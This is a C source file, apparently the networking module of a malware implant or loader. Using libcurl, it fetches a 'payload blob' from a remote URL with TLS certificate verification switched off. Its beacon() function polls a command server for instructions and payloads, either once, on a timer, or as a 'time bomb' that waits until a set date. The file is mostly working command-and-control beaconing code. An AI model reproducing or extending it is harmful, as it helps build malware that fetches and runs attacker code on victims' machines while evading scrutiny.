/**
 * Holds all functions for needed networking functionality.
 * 
 * Authors: Robert Weiner, Elitania Venturella
 */

#include "networking.h"
#include "preferences.h"

/**
 * @brief DO NOT CALL MANUALLY. Function to overwrite libcurl's default WriteCallback.
 * @note Will write all incoming data to passed in MemoryStruct pointer's memory element
 * Will keep track of the total size of the incoming data
 * Will re-size the struct's memory element when needed
 */
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1); // re-size the memory element
    if (ptr == NULL)
    {
        /* out of memory! */
        return 0;
    }

    // save incoming data
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

/**
 * @brief Retrieve the file at the given URL using libCurl.
 * @param url: Formatted URL to retrieve payload blob from.
 * @retval MemoryStruct object holding the payload blob and it's size.
*/
struct MemoryStruct getHTTPS(char *URL)
{
    CURL *curl_handle;
    CURLcode res;
    struct MemoryStruct payload;
    long httpCode = 0;

    payload.memory = malloc(1); // will grow, just set to 1 to have it set up
    payload.size = 0;           // size will grow, set to 0 to start

    curl_global_init(CURL_GLOBAL_ALL);

    curl_handle = curl_easy_init();
    if (curl_handle)
    {
        curl_easy_setopt(curl_handle, CURLOPT_URL, URL);                   // set url
        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback); // set writing function override
        curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&payload);        // set writing destination
        curl_easy_setopt(curl_handle, CURLOPT_FAILONERROR, (long)1);               // do not retry on error
        curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, (long)0);            // do not verify host
        curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, (long)0);            // do not verify peer

        res = curl_easy_perform(curl_handle);

        curl_easy_getinfo(curl_handle, CURLINFO_RESPONSE_CODE, &httpCode);

        //error checking
        if ((res != CURLE_OK) || (res == CURLE_HTTP_RETURNED_ERROR))
        {
            free(payload.memory);
            payload.memory = NULL; // return null pointer for error
            return payload;
        }

        //always cleanup
        curl_easy_cleanup(curl_handle);
    }
    return payload;
}

/**
 * @brief Beacon for payload blob according to beaconing modes defined in preferences.h.
 * @param URL: Formatted URL to beacon to.
 * @param initial: Boolean for whether this is beaconing for intructions or a payload.
 * @retval MemoryStruct object holding the returned file blob.
 */
struct MemoryStruct beacon(char *URL, char initial)
{
    struct MemoryStruct payload;
    size_t beaconMode;
    size_t beaconDateTime;

    if (initial == 1) // first beacon
    {
        beaconMode = BEACON_MODE_INITIAL;
        beaconDateTime = BEACON_DATE_TIME_INITIAL;
    }
    else if(initial == 2) // beacon for instructions any time after first
    {
        beaconMode = BEACON_MODE_INSTRUCTIONS;
        beaconDateTime = BEACON_DATE_TIME_INSTRUCTIONS;
    }
    else
    {
        beaconMode = BEACON_MODE;
        beaconDateTime = BEACON_DATE_TIME;
    }

    if (beaconMode == 0) // beacon instantly once
    {
        payload = getHTTPS(URL);
        if (payload.memory == NULL)
        {            // error condition
            exit(0); // if file not obtained and set to only beacon once, exit immediately
        }
    }
    else if (beaconMode == -1) // time bomb beacon
    {
        if (beaconDateTime > time(NULL)) // beacon date/time not reached yet, sleep
        {
            sleep(beaconDateTime - time(NULL));
        }
        
        payload = getHTTPS(URL);
        if (payload.memory == NULL)
        {            // error condition
            exit(0);
        }
    }
    else // beacon every x seconds
    { 
        while (1)
        {
            sleep(beaconMode);
            payload = getHTTPS(URL);
            if (payload.memory == NULL)
            { // continue beaconing if no file returned
                continue;
            }
            break; // exit beaconing loop if file is returned
        }
    }
    return payload;
}